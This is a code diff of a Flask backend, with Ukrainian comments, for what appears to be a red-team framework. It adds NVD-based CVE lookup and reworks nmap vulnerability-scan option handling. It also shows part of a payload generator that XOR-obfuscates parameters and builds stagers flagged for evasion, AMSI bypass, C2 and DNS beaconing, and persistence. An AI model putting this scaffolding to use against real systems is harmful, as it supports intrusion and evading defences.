         log_messages.append(f"[NMAP_XML_PARSE_SUCCESS] Успішно розпарсено XML, знайдено {len(parsed_services)} відкритих сервісів та {len(parsed_os_info)} записів ОС/хост-скриптів.")
     except ET.ParseError as e_parse:
         log_messages.append(f"[NMAP_XML_PARSE_ERROR] Помилка парсингу XML: {e_parse}")
@@ -710,92 +682,261 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
         log_messages.append(f"[NMAP_XML_PARSE_FATAL] Непередбачена помилка під час парсингу XML: {e_generic}")
     return parsed_services, parsed_os_info
 
-def simulate_external_cve_api_call(service_key_raw: str, log_messages: list) -> list[dict]:
-    """Імітує виклик до зовнішнього API для отримання даних CVE."""
-    log_messages.append(f"[CVE_API_SIM_INFO] Імітація виклику зовнішнього API для ключа сервісу: '{service_key_raw}'.")
-    time.sleep(random.uniform(0.2, 0.6)) # Імітація мережевої затримки
+def fetch_cves_from_nvd_api(service_key_raw: str, service_cpes: list, log_messages: list) -> list[dict]:
+    """
+    Отримує дані CVE з NVD API 2.0 на основі ключа сервісу або CPE.
+    """
+    nvd_cves_found = []
+    headers = {}
+    if NVD_API_KEY:
+        headers['apiKey'] = NVD_API_KEY
 
-    api_cves_found = []
-    # Прямий пошук за повним ключем
-    if service_key_raw in MOCK_EXTERNAL_CVE_API_DB:
-        api_cves_found.extend(MOCK_EXTERNAL_CVE_API_DB[service_key_raw])
-        log_messages.append(f"[CVE_API_SIM_DEBUG] Зовнішній API: Точне співпадіння для ключа '{service_key_raw}'. Знайдено {len(MOCK_EXTERNAL_CVE_API_DB[service_key_raw])} CVE.")
-    else:
-        # Пошук за частковим співпадінням (наприклад, тільки назва продукту без версії)
-        product_part_of_key = service_key_raw.split(' ')[0]
-        for db_key_external, db_cves_list_external in MOCK_EXTERNAL_CVE_API_DB.items():
-            if service_key_raw.startswith(db_key_external.split(' ')[0]) and product_part_of_key in db_key_external: # Перевірка, що ключ починається з назви продукту
-                # Для більшої точності, можна додати перевірку версії, якщо вона є в service_key_raw
-                # Тут ми просто додаємо всі CVE, якщо назва продукту співпадає
-                api_cves_found.extend(db_cves_list_external)
-                log_messages.append(f"[CVE_API_SIM_DEBUG] Зовнішній API: Часткове співпадіння для '{service_key_raw}' -> знайдено CVE для '{db_key_external}'. Додано {len(db_cves_list_external)} CVE.")
-    
-    # Забезпечення унікальності CVE за ID
-    unique_cve_ids_for_service_api = set()
-    final_cves_from_api = []
-    for cve_entry_api in api_cves_found:
-        if cve_entry_api['cve_id'] not in unique_cve_ids_for_service_api:
-            final_cves_from_api.append(cve_entry_api)
-            unique_cve_ids_for_service_api.add(cve_entry_api['cve_id'])
+    # Пріоритетний пошук за CPE, якщо вони є
+    if service_cpes:
+        for cpe in service_cpes:
+            # Формуємо CPE для запиту (може потребувати точнішого форматування залежно від CPE з Nmap)
+            # Приклад: cpe:/a:apache:http_server:2.4.53 -> cpeName=cpe:2.3:a:apache:http_server:2.4.53:*:*:*:*:*:*:*
+            # NVD API очікує CPE 2.3. Якщо Nmap дає CPE 2.2, його треба конвертувати або шукати за ключовими словами.
+            # Для простоти, поки що використовуємо CPE "як є", якщо він схожий на валідний.
+            # Або можна витягнути назву продукту та версію з CPE для keywordSearch.
+            
+            # Спрощений підхід: якщо CPE містить версію, спробуємо пошук за ним
+            cpe_match_for_query = cpe 
+            # TODO: Додати більш надійну логіку перетворення CPE з Nmap у формат для NVD API
+            # Наприклад, якщо cpe від nmap: "cpe:/a:apache:http_server:2.4.53", то для NVD API краще "cpe:2.3:a:apache:http_server:2.4.53:*:*:*:*:*:*:*"
 
-    if final_cves_from_api:
-        log_messages.append(f"[CVE_API_SIM_SUCCESS] Зовнішній API повернув {len(final_cves_from_api)} унікальних CVE для ключа '{service_key_raw}'.")
-    else:
-        log_messages.append(f"[CVE_API_SIM_INFO] Зовнішній API не повернув CVE для ключа '{service_key_raw}'.")
+            log_messages.append(f"[NVD_API_INFO] Запит до NVD API за CPE: '{cpe_match_for_query}'.")
+            params = {'cpeName': cpe_match_for_query, 'resultsPerPage': NVD_RESULTS_PER_PAGE}
+            try:
+                response = requests.get(NVD_API_BASE_URL, headers=headers, params=params, timeout=NVD_REQUEST_TIMEOUT_SECONDS)
+                response.raise_for_status() # Викине помилку для кодів 4xx/5xx
+                data = response.json()
+                
+                total_results = data.get('totalResults', 0)
+                log_messages.append(f"[NVD_API_RESPONSE] Отримано {len(data.get('vulnerabilities', []))} вразливостей (загалом {total_results}) для CPE '{cpe_match_for_query}'.")
+
+                for vuln in data.get('vulnerabilities', []):
+                    cve_item = vuln.get('cve', {})
+                    cve_id = cve_item.get('id')
+                    description = "N/A"
+                    if cve_item.get('descriptions'):
+                        for desc_entry in cve_item.get('descriptions'):
+                            if desc_entry.get('lang') == 'en':
+                                description = desc_entry.get('value')
+                                break
+                    
+                    severity = "UNKNOWN"
+                    cvss_score = None
+                    cvss_vector = None
+                    cvss_version = None
+
+                    # Пріоритет CVSS v3.1, потім v3.0, потім v2.0
+                    if cve_item.get('metrics', {}).get('cvssMetricV31'):
+                        cvss_data = cve_item['metrics']['cvssMetricV31'][0].get('cvssData', {})
+                        severity = cvss_data.get('baseSeverity', severity)
+                        cvss_score = cvss_data.get('baseScore')
+                        cvss_vector = cvss_data.get('vectorString')
+                        cvss_version = "3.1"
+                    elif cve_item.get('metrics', {}).get('cvssMetricV30'):
+                        cvss_data = cve_item['metrics']['cvssMetricV30'][0].get('cvssData', {})
+                        severity = cvss_data.get('baseSeverity', severity)
+                        cvss_score = cvss_data.get('baseScore')
+                        cvss_vector = cvss_data.get('vectorString')
+                        cvss_version = "3.0"
+                    elif cve_item.get('metrics', {}).get('cvssMetricV2'):
+                        cvss_data = cve_item['metrics']['cvssMetricV2'][0].get('cvssData', {})
+                        severity = cvss_data.get('baseSeverity', severity) # CVSSv2 має LOW, MEDIUM, HIGH
+                        cvss_score = cvss_data.get('baseScore')
+                        cvss_vector = cvss_data.get('vectorString')
+                        cvss_version = "2.0"
+
+                    references = [ref.get('url') for ref in cve_item.get('references', []) if ref.get('url')]
+                    
+                    nvd_cves_found.append({
+                        "cve_id": cve_id,
+                        "summary": description,
+                        "severity": severity.upper() if severity else "UNKNOWN",
+                        "cvss_score": cvss_score,
+                        "cvss_vector": cvss_vector,
+                        "cvss_version": cvss_version,
+                        "published_date": cve_item.get('published'),
+                        "last_modified_date": cve_item.get('lastModified'),
+                        "vulnerable_configurations_cpe": [config.get('criteria') for node in cve_item.get('configurations', []) for config in node.get('nodes', []) if config.get('cpeMatch')], # Спрощено
+                        "references": references,
+                        "source": "NVD API"
+                    })
+                # Тут можна додати логіку для обробки пагінації, якщо total_results > NVD_RESULTS_PER_PAGE
+            except requests.exceptions.RequestException as e_req:
+                log_messages.append(f"[NVD_API_ERROR] Помилка запиту до NVD API для CPE '{cpe_match_for_query}': {e_req}")
+            except json.JSONDecodeError as e_json:
+                log_messages.append(f"[NVD_API_ERROR] Помилка розбору JSON відповіді від NVD API для CPE '{cpe_match_for_query}': {e_json}")
+            except Exception as e_generic:
+                log_messages.append(f"[NVD_API_FATAL] Непередбачена помилка під час обробки NVD API для CPE '{cpe_match_for_query}': {e_generic}")
+            time.sleep(0.6) # Затримка між запитами, щоб не перевантажувати NVD API (особливо без ключа)
+
+    # Якщо пошук за CPE не дав результатів або CPE відсутні, спробуємо пошук за ключовими словами
+    if not nvd_cves_found and service_key_raw:
+        log_messages.append(f"[NVD_API_INFO] Запит до NVD API за ключовими словами: '{service_key_raw}'.")
+        params = {'keywordSearch': service_key_raw, 'resultsPerPage': NVD_RESULTS_PER_PAGE, 'keywordExactMatch': ''} # Додаємо keywordExactMatch для потенційно точніших результатів
+        try:
+            response = requests.get(NVD_API_BASE_URL, headers=headers, params=params, timeout=NVD_REQUEST_TIMEOUT_SECONDS)
+            response.raise_for_status()
+            data = response.json()
+            total_results = data.get('totalResults', 0)
+            log_messages.append(f"[NVD_API_RESPONSE] Отримано {len(data.get('vulnerabilities', []))} вразливостей (загалом {total_results}) для ключових слів '{service_key_raw}'.")
+
+            for vuln in data.get('vulnerabilities', []):
+                cve_item = vuln.get('cve', {})
+                # ... (логіка парсингу CVE, аналогічна до тієї, що вище для CPE) ...
+                cve_id = cve_item.get('id')
+                description = "N/A"
+                if cve_item.get('descriptions'):
+                    for desc_entry in cve_item.get('descriptions'):
+                        if desc_entry.get('lang') == 'en':
+                            description = desc_entry.get('value')
+                            break
+                
+                severity = "UNKNOWN"
+                cvss_score = None
+                cvss_vector = None
+                cvss_version = None
+                if cve_item.get('metrics', {}).get('cvssMetricV31'):
+                    cvss_data = cve_item['metrics']['cvssMetricV31'][0].get('cvssData', {})
+                    severity = cvss_data.get('baseSeverity', severity)
+                    cvss_score = cvss_data.get('baseScore')
+                    cvss_vector = cvss_data.get('vectorString')
+                    cvss_version = "3.1"
+                elif cve_item.get('metrics', {}).get('cvssMetricV30'):
+                    cvss_data = cve_item['metrics']['cvssMetricV30'][0].get('cvssData', {})
+                    severity = cvss_data.get('baseSeverity', severity)
+                    cvss_score = cvss_data.get('baseScore')
+                    cvss_vector = cvss_data.get('vectorString')
+                    cvss_version = "3.0"
+                elif cve_item.get('metrics', {}).get('cvssMetricV2'):
+                    cvss_data = cve_item['metrics']['cvssMetricV2'][0].get('cvssData', {})
+                    severity = cvss_data.get('baseSeverity', severity)
+                    cvss_score = cvss_data.get('baseScore')
+                    cvss_vector = cvss_data.get('vectorString')
+                    cvss_version = "2.0"
+
+                references = [ref.get('url') for ref in cve_item.get('references', []) if ref.get('url')]
+                
+                nvd_cves_found.append({
+                    "cve_id": cve_id, "summary": description,
+                    "severity": severity.upper() if severity else "UNKNOWN",
+                    "cvss_score": cvss_score, "cvss_vector": cvss_vector, "cvss_version": cvss_version,
+                    "published_date": cve_item.get('published'), "last_modified_date": cve_item.get('lastModified'),
+                    "vulnerable_configurations_cpe": [config.get('criteria') for node in cve_item.get('configurations', []) for config in node.get('nodes', []) if config.get('cpeMatch')],
+                    "references": references, "source": "NVD API (Keyword)"
+                })
+        except requests.exceptions.RequestException as e_req:
+            log_messages.append(f"[NVD_API_ERROR] Помилка запиту до NVD API за ключовими словами '{service_key_raw}': {e_req}")
+        except json.JSONDecodeError as e_json:
+            log_messages.append(f"[NVD_API_ERROR] Помилка розбору JSON відповіді від NVD API за ключовими словами '{service_key_raw}': {e_json}")
+        except Exception as e_generic:
+            log_messages.append(f"[NVD_API_FATAL] Непередбачена помилка під час обробки NVD API за ключовими словами '{service_key_raw}': {e_generic}")
+
+    # Дедуплікація результатів, якщо один CVE знайдено кількома шляхами (наприклад, через різні CPE)
+    unique_cves_from_nvd = []
+    seen_cve_ids_nvd = set()
+    for cve_entry in nvd_cves_found:
+        if cve_entry['cve_id'] not in seen_cve_ids_nvd:
+            unique_cves_from_nvd.append(cve_entry)
+            seen_cve_ids_nvd.add(cve_entry['cve_id'])
     
-    return final_cves_from_api
+    if unique_cves_from_nvd:
+        log_messages.append(f"[NVD_API_SUCCESS] NVD API повернув {len(unique_cves_from_nvd)} унікальних CVE.")
+    else:
+        log_messages.append(f"[NVD_API_INFO] NVD API не повернув CVE для запиту (ключ: '{service_key_raw}', CPEs: {service_cpes}).")
+    return unique_cves_from_nvd
 
 def conceptual_cve_lookup_be(services_info: list, log_messages: list) -> list[dict]:
-    """Виконує пошук CVE для списку сервісів, використовуючи імітований зовнішній API."""
+    """
+    Виконує пошук CVE для списку сервісів, використовуючи NVD API 
+    з резервним механізмом до MOCK_EXTERNAL_CVE_API_DB та CONCEPTUAL_CVE_DATABASE_BE.
+    """
     found_cves_overall = []
-    log_messages.append(f"[CVE_LOOKUP_BE_INFO] Пошук CVE для {len(services_info)} виявлених сервісів (через імітацію зовнішнього API).")
+    processed_cve_ids = set() # Для дедуплікації на всіх етапах
+    log_messages.append(f"[CVE_LOOKUP_BE_INFO] Пошук CVE для {len(services_info)} виявлених сервісів.")
 
     for service_item in services_info:
         service_key_raw = service_item.get("service_key_for_cve", "").lower().strip()
-        if not service_key_raw:
-            log_messages.append(f"[CVE_LOOKUP_BE_WARN] Пропущено сервіс (порт {service_item.get('port')}) через порожній ключ CVE.")
+        service_cpes_list = service_item.get("cpes", []) # Отримуємо список CPE з сервісу
+        host_ip_for_cve = service_item.get("host_ip")
+        port_for_cve = service_item.get("port")
+
+        if not service_key_raw and not service_cpes_list:
+            log_messages.append(f"[CVE_LOOKUP_BE_WARN] Пропущено сервіс (порт {port_for_cve}) через порожній ключ CVE та відсутність CPE.")
             continue
 
-        # Виклик імітованого зовнішнього API
-        cves_from_external_api = simulate_external_cve_api_call(service_key_raw, log_messages)
-
-        if cves_from_external_api:
-            log_messages.append(f"[CVE_LOOKUP_BE_SUCCESS] Знайдено CVE через зовнішній API для сервісу '{service_key_raw}' (порт {service_item.get('port')}):")
-            for cve_entry in cves_from_external_api:
-                log_messages.append(f"  - {cve_entry['cve_id']} ({cve_entry['severity']}) (Джерело: {cve_entry.get('source', 'N/A')}): {cve_entry['summary'][:70]}...")
+        # 1. Спроба отримати дані з NVD API
+        log_messages.append(f"[CVE_LOOKUP_BE_NVD_ATTEMPT] Спроба запиту до NVD API для сервісу '{service_key_raw}' (CPEs: {service_cpes_list}).")
+        cves_from_nvd = fetch_cves_from_nvd_api(service_key_raw, service_cpes_list, log_messages)
+        
+        for cve_nvd in cves_from_nvd:
+            if cve_nvd['cve_id'] not in processed_cve_ids:
                 found_cves_overall.append({
-                    "host_ip": service_item.get("host_ip"), # Додаємо IP хоста
-                    "port": service_item.get("port"),
-                    "service_key": service_key_raw,
-                    "matched_db_key": service_key_raw, # Ключ, що використовувався для API
-                    "cve_id": cve_entry['cve_id'],
-                    "severity": cve_entry['severity'],
-                    "summary": cve_entry['summary'],
-                    "source": cve_entry.get('source', 'External API (Simulated)')
+                    "host_ip": host_ip_for_cve, "port": port_for_cve,
+                    "service_key": service_key_raw, "matched_db_key": service_key_raw, # Або CPE, якщо пошук був за ним
+                    **cve_nvd # Додаємо всі поля з cve_nvd
                 })
-        else:
-            # Можна додати резервний пошук у CONCEPTUAL_CVE_DATABASE_BE, якщо зовнішній API нічого не повернув
-            log_messages.append(f"[CVE_LOOKUP_BE_INFO] Зовнішній API не повернув CVE для '{service_key_raw}'. Спроба пошуку у внутрішній резервній базі...")
-            fallback_cves = []
-            if service_key_raw in CONCEPTUAL_CVE_DATABASE_BE:
-                 fallback_cves.extend(CONCEPTUAL_CVE_DATABASE_BE[service_key_raw])
-            
-            if fallback_cves:
-                log_messages.append(f"[CVE_LOOKUP_BE_FALLBACK_SUCCESS] Знайдено CVE у внутрішній резервній базі для '{service_key_raw}':")
-                for cve_entry_fb in fallback_cves:
-                    log_messages.append(f"  - {cve_entry_fb['cve_id']} ({cve_entry_fb['severity']}) (Джерело: Internal Fallback): {cve_entry_fb['summary'][:70]}...")
-                    found_cves_overall.append({
-                        "host_ip": service_item.get("host_ip"),
-                        "port": service_item.get("port"), "service_key": service_key_raw,
-                        "matched_db_key": service_key_raw, "cve_id": cve_entry_fb['cve_id'],
-                        "severity": cve_entry_fb['severity'], "summary": cve_entry_fb['summary'],
-                        "source": "Internal Fallback DB"
-                    })
-            else:
-                 log_messages.append(f"[CVE_LOOKUP_BE_INFO] CVE не знайдено для сервісу '{service_key_raw}' (порт {service_item.get('port')}) ні через зовнішній API, ні у внутрішній базі.")
+                processed_cve_ids.add(cve_nvd['cve_id'])
+                log_messages.append(f"  [NVD_HIT] {cve_nvd['cve_id']} ({cve_nvd['severity']}) - {cve_nvd['summary'][:70]}...")
+        
+        # 2. Резервний механізм: MOCK_EXTERNAL_CVE_API_DB (якщо NVD не дав результатів або для доповнення)
+        # Цей блок можна активувати, якщо cves_from_nvd порожній, або для злиття результатів.
+        # Для простоти, поки що додаємо, якщо NVD нічого не знайшов для service_key_raw.
+        # Або можна завжди перевіряти, якщо є бажання злити дані з усіх джерел.
+        
+        # Пошук у MOCK_EXTERNAL_CVE_API_DB
+        mock_api_cves_found = []
+        if service_key_raw in MOCK_EXTERNAL_CVE_API_DB:
+            mock_api_cves_found.extend(MOCK_EXTERNAL_CVE_API_DB[service_key_raw])
+        else: # Часткове співпадіння для MOCK_EXTERNAL_CVE_API_DB
+            product_part_of_key_mock = service_key_raw.split(' ')[0]
+            for db_key_mock, db_cves_list_mock in MOCK_EXTERNAL_CVE_API_DB.items():
+                if service_key_raw.startswith(db_key_mock.split(' ')[0]) and product_part_of_key_mock in db_key_mock:
+                    mock_api_cves_found.extend(db_cves_list_mock)
+        
+        for cve_mock in mock_api_cves_found:
+            if cve_mock['cve_id'] not in processed_cve_ids:
+                found_cves_overall.append({
+                    "host_ip": host_ip_for_cve, "port": port_for_cve,
+                    "service_key": service_key_raw, "matched_db_key": service_key_raw, 
+                    "cve_id": cve_mock['cve_id'], "severity": cve_mock['severity'],
+                    "summary": cve_mock['summary'], "source": cve_mock.get('source', 'Mock External API'),
+                    # Додаємо порожні значення для нових полів, якщо їх немає в mock
+                    "cvss_score": None, "cvss_vector": None, "cvss_version": None,
+                    "published_date": None, "last_modified_date": None,
+                    "vulnerable_configurations_cpe": [], "references": []
+                })
+                processed_cve_ids.add(cve_mock['cve_id'])
+                log_messages.append(f"  [MOCK_DB_HIT] {cve_mock['cve_id']} ({cve_mock['severity']}) - {cve_mock['summary'][:70]}...")
+
+        # 3. Резервний механізм: CONCEPTUAL_CVE_DATABASE_BE (внутрішня база)
+        internal_db_cves_found = []
+        if service_key_raw in CONCEPTUAL_CVE_DATABASE_BE:
+            internal_db_cves_found.extend(CONCEPTUAL_CVE_DATABASE_BE[service_key_raw])
+        
+        for cve_internal in internal_db_cves_found:
+            if cve_internal['cve_id'] not in processed_cve_ids:
+                found_cves_overall.append({
+                    "host_ip": host_ip_for_cve, "port": port_for_cve,
+                    "service_key": service_key_raw, "matched_db_key": service_key_raw, 
+                    "cve_id": cve_internal['cve_id'], "severity": cve_internal['severity'],
+                    "summary": cve_internal['summary'], "source": "Internal Fallback DB",
+                    "cvss_score": None, "cvss_vector": None, "cvss_version": None,
+                    "published_date": None, "last_modified_date": None,
+                    "vulnerable_configurations_cpe": [], "references": []
+                })
+                processed_cve_ids.add(cve_internal['cve_id'])
+                log_messages.append(f"  [INTERNAL_DB_HIT] {cve_internal['cve_id']} ({cve_internal['severity']}) - {cve_internal['summary'][:70]}...")
 
     if not found_cves_overall:
-        log_messages.append("[CVE_LOOKUP_BE_INFO] Відповідних CVE не знайдено для жодного сервісу.")
+        log_messages.append("[CVE_LOOKUP_BE_INFO] Відповідних CVE не знайдено для жодного сервісу з усіх джерел.")
+    else:
+        log_messages.append(f"[CVE_LOOKUP_BE_SUCCESS] Загалом знайдено {len(found_cves_overall)} унікальних CVE записів.")
+    
     return found_cves_overall
 
 
@@ -807,56 +948,47 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
     if use_xml_output:
         xml_output_option_present = any("-oX" in opt for opt in effective_options)
         if not xml_output_option_present:
-            effective_options.extend(["-oX", "-"]) # Вивід XML в stdout
-        # Для XML виводу бажано мати версії сервісів та ОС для кращого парсингу
-        if not any("-sV" in opt for opt in effective_options): # Визначення версій сервісів
+            effective_options.extend(["-oX", "-"]) 
+        if not any("-sV" in opt for opt in effective_options): 
              effective_options.append("-sV")
-        if not any("-O" in opt for opt in effective_options) and not any("-A" in opt for opt in effective_options): # Визначення ОС (якщо не агресивний режим -A)
+        if not any("-O" in opt for opt in effective_options) and not any("-A" in opt for opt in effective_options): 
              effective_options.append("-O")
     
-    # Спеціальні налаштування для типу vuln_scripts, якщо опції не задані користувачем
-    if recon_type_hint == "port_scan_nmap_vuln_scripts" and not options: # Якщо користувач не надав свої опції для vuln_scripts
-        effective_options.extend(["-sV", "--script", "vuln", "-Pn"]) # -Pn для уникнення пропуску хостів, що не відповідають на ping
+    if recon_type_hint == "port_scan_nmap_vuln_scripts" and not options: 
+        effective_options.extend(["-sV", "--script", "vuln", "-Pn"]) 
         log.append("[RECON_NMAP_BE_INFO] Використання дефолтних опцій для vuln_scripts: -sV --script vuln -Pn")
-        if not any("-oX" in opt for opt in effective_options): # Переконуємося, що XML є для vuln_scripts
+        if not any("-oX" in opt for opt in effective_options): 
             effective_options.extend(["-oX", "-"])
-    elif not effective_options: # Якщо взагалі немає опцій (наприклад, для standard_scan без кастомних опцій)
+    elif not effective_options: 
         effective_options = ["-sV", "-T4", "-Pn"] if not use_xml_output else ["-sV", "-O", "-T4", "-Pn", "-oX", "-"]
 
-    # Фільтрація та валідація опцій nmap
     allowed_options_prefixes = ["-sV", "-Pn", "-T4", "-p", "-F", "-A", "-O", "--top-ports", "-sS", "-sU", "-sC", "-oX", "-oN", "-oG", "-iL", "--script", "--script-args"]
     final_command_parts = [base_command[0]]
-    seen_options_main = set() # Для уникнення дублювання основних опцій типу -sV, -O
-    has_A_option = any("-A" in opt for opt in effective_options) # -A включає -sV та -O
+    seen_options_main = set() 
+    has_A_option = any("-A" in opt for opt in effective_options) 
     if has_A_option:
         seen_options_main.add("-sV")
         seen_options_main.add("-O")
-        seen_options_main.add("-sC") # -A також включає -sC
+        seen_options_main.add("-sC") 
 
     temp_opts_for_cmd = []
     i = 0
     while i < len(effective_options):
         opt = effective_options[i]
-        main_opt_part = opt.split(' ')[0] # Основна частина опції, напр. -sV з "-sV -versionIntensity 5"
+        main_opt_part = opt.split(' ')[0] 
         
-        # Перевірка, чи опція дозволена
         is_allowed = any(opt.startswith(p) for p in allowed_options_prefixes)
-        # Перевірка, чи це схоже на аргумент для попередньої опції (напр. "vuln" для --script, або "80,443" для -p)
         is_arg_like = opt.replace("-","").isalnum() or re.match(r"^\d+(-\d+)?(,\d+(-\d+)?)*$", opt) or "=" in opt or "," in opt or ".nse" in opt
 
         if is_allowed:
-            # Додаємо опцію, якщо її ще не було, або це --script/--script-args (можуть повторюватись)
             if main_opt_part not in seen_options_main or main_opt_part in ["--script", "--script-args"]: 
                 temp_opts_for_cmd.append(opt)
-                if main_opt_part not in ["--script", "--script-args"]: # Не додаємо --script до seen, щоб дозволити кілька
+                if main_opt_part not in ["--script", "--script-args"]: 
                     seen_options_main.add(main_opt_part)
                 
-                # Якщо опція вимагає аргументу (напр. -p <ports>, --script <name>), додаємо наступний елемент як аргумент
                 if main_opt_part in ["-p", "--top-ports", "-oX", "-oN", "-oG", "-iL", "--script", "--script-args"] and (i + 1) < len(effective_options):
-                    # Перевіряємо, чи наступний елемент не є новою опцією (крім випадків, коли аргумент сам може починатися з дефісу або містити спецсимволи)
-                    is_next_another_option = any(effective_options[i+1].startswith(p) for p in allowed_options_prefixes if p != effective_options[i+1]) # p != effective_options[i+1] щоб дозволити аргументи типу "-oX -"
+                    is_next_another_option = any(effective_options[i+1].startswith(p) for p in allowed_options_prefixes if p != effective_options[i+1]) 
                     
-                    # Дозволяємо аргументи типу "vuln", "http-title.nse", "arg1=val1,arg2=val2", або "-" для -oX
                     if not is_next_another_option or \
                        effective_options[i+1].startswith("vuln") or \
                        ".nse" in effective_options[i+1] or \
@@ -864,9 +996,8 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
                        "," in effective_options[i+1] or \
                        effective_options[i+1] == "-":
                         temp_opts_for_cmd.append(effective_options[i+1])
-                        i += 1 # Пропускаємо наступний елемент, оскільки він є аргументом
+                        i += 1 
             elif main_opt_part == "-oX" and opt == "-oX" and (i + 1) < len(effective_options) and effective_options[i+1] == "-":
-                 # Спеціальна обробка для "-oX -" якщо вже є інший -oX
                  if not ("-oX" in temp_opts_for_cmd and "-" in temp_opts_for_cmd[temp_opts_for_cmd.index("-oX")+1:]):
                     temp_opts_for_cmd.append("-oX")
                     temp_opts_for_cmd.append("-")
@@ -874,15 +1005,14 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
             else:
                 log.append(f"[RECON_NMAP_BE_WARN] Опцію '{main_opt_part}' або її варіант вже додано або вона конфліктує. Пропускається: {opt}")
         elif is_arg_like and temp_opts_for_cmd and any(temp_opts_for_cmd[-1].startswith(p) for p in ["-p", "--top-ports", "-oX", "-oN", "-oG", "-iL", "--script", "--script-args"]):
-             # Якщо це схоже на аргумент і попередня опція його очікує
              log.append(f"[RECON_NMAP_BE_DEBUG] Додавання потенційного аргументу '{opt}' для попередньої опції '{temp_opts_for_cmd[-1]}'.")
              temp_opts_for_cmd.append(opt)
-        elif not is_allowed: # Якщо опція не в списку дозволених і не схожа на аргумент
+        elif not is_allowed: 
              log.append(f"[RECON_NMAP_BE_WARN] Недозволена або невідома опція nmap: {opt}")
         i += 1
 
     final_command_parts.extend(temp_opts_for_cmd)
-    final_command_parts.append(target) # Додаємо ціль в кінці
+    final_command_parts.append(target) 
     log.append(f"[RECON_NMAP_BE_CMD_FINAL] Команда nmap: {' '.join(final_command_parts)}")
 
     parsed_services_list = []
@@ -901,7 +1031,7 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
             log.append(f"[RECON_NMAP_BE_ERROR] {error_message}")
             if "Host seems down" in raw_output_text:
                  raw_output_text += "\nПідказка: Ціль може бути недоступна або блокувати ping. Спробуйте опцію -Pn."
-            elif " consentement explicite" in raw_output_text or "explicit permission" in raw_output_text : # Nmap попередження про легальність
+            elif " consentement explicite" in raw_output_text or "explicit permission" in raw_output_text : 
                  raw_output_text += "\nПОПЕРЕДЖЕННЯ NMAP: Сканування мереж без явного дозволу є незаконним у багатьох країнах."
     except FileNotFoundError:
         log.append("[RECON_NMAP_BE_ERROR] Команду nmap не знайдено.")
@@ -914,7 +1044,6 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
         raw_output_text = f"Непередбачена помилка під час nmap сканування: {str(e)}"
     
     return log, raw_output_text, parsed_services_list, parsed_os_list
-
 
 def generate_simulated_operational_logs_be() -> list[dict]:
     logs = []
@@ -943,7 +1072,7 @@ def generate_simulated_operational_logs_be() -> list[dict]:
             )
         }
         logs.append(log_entry)
-    logs.sort(key=lambda x: x["timestamp"]) # Сортуємо за часом
+    logs.sort(key=lambda x: x["timestamp"]) 
     return logs
 
 def get_simulated_stats_be() -> dict:
@@ -951,12 +1080,12 @@ def get_simulated_stats_be() -> dict:
     return {
         "successRate": random.randint(60, 95), "detectionRate": random.randint(5, 25),
         "bestArchetype": random.choice(CONCEPTUAL_PARAMS_SCHEMA_BE["payload_archetype"]["allowed_values"]),
-        "activeImplants": len(simulated_implants_be) # Кількість активних імплантів
+        "activeImplants": len(simulated_implants_be) 
     }
 
 app = Flask(__name__)
-CORS(app) # Дозволяємо CORS для всіх джерел
-initialize_simulated_implants_be() # Ініціалізуємо симульовані імпланти при старті
+CORS(app) 
+initialize_simulated_implants_be() 
 
 @app.route('/api/generate_payload', methods=['POST'])
 def handle_generate_payload():
@@ -978,7 +1107,7 @@ def handle_generate_payload():
         archetype_details = CONCEPTUAL_ARCHETYPE_TEMPLATES_BE.get(archetype_name)
         log_messages.append(f"[BACKEND_ARCHETYPE_INFO] Архетип: {archetype_name} - {archetype_details['description']}")
 
-        data_to_obfuscate_or_patch = {} # Словник для даних, що потребують обробки перед обфускацією
+        data_to_obfuscate_or_patch = {} 
         if archetype_name == "demo_echo_payload":
             data_to_obfuscate_or_patch['message'] = validated_params.get("message_to_echo", "Default Echo Message")
         elif archetype_name == "demo_file_lister_payload":
@@ -1001,9 +1130,8 @@ def handle_generate_payload():
             data_to_obfuscate_or_patch['command_to_persist'] = validated_params.get("command_to_persist")
             data_to_obfuscate_or_patch['artifact_name'] = validated_params.get("artifact_name")
 
-
         key = validated_params.get("obfuscation_key", "DefaultFrameworkKey")
-        obfuscated_payload_params_json = json.dumps(data_to_obfuscate_or_patch) # Параметри пейлоада у JSON
+        obfuscated_payload_params_json = json.dumps(data_to_obfuscate_or_patch) 
         log_messages.append(f"[BACKEND_OBF_INFO] Обфускація параметрів пейлоада: '{obfuscated_payload_params_json[:100]}...' з ключем '{key}'.")
         obfuscated_data_raw = xor_cipher(obfuscated_payload_params_json, key)
         obfuscated_data_b64 = b64_encode_str(obfuscated_data_raw)
@@ -1015,8 +1143,8 @@ def handle_generate_payload():
             f"# SYNTAX Conceptual Python Stager (Backend Generated v{VERSION_BACKEND})",
             f"# Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"# Archetype: {archetype_name}",
-            f"OBFUSCATION_KEY_EMBEDDED = \"{key}\"", # Вбудовуємо ключ обфускації
-            f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"", # Вбудовуємо обфусковані дані
+            f"OBFUSCATION_KEY_EMBEDDED = \"{key}\"", 
+            f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"", 
             f"METAMORPHISM_APPLIED = {validated_params.get('enable_stager_metamorphism', False)}",
             f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}",
             f"AMSI_BYPASS_CONCEPT_APPLIED = {validated_params.get('enable_amsi_bypass_concept', False)}",
@@ -1027,37 +1155,33 @@ def handle_generate_payload():
             ps_args = validated_params.get("powershell_execution_args", "")
             stager_code_lines.append(f"POWERSHELL_EXEC_ARGS = \"{ps_args}\"")
         elif archetype_name == "demo_c2_beacon_payload":
-            stager_implant_id = f"STGIMPLNT-{random.randint(100,999)}" # Унікальний ID для цього стейджера
+            stager_implant_id = f"STGIMPLNT-{random.randint(100,999)}" 
             stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
-            stager_code_lines.append(f"BEACON_INTERVAL_SEC = {random.randint(10, 25)}") # Інтервал маячка
+            stager_code_lines.append(f"BEACON_INTERVAL_SEC = {random.randint(10, 25)}") 
         elif archetype_name == "dns_beacon_c2_concept":
             stager_implant_id = f"DNSIMPLNT-{random.randint(100,999)}"
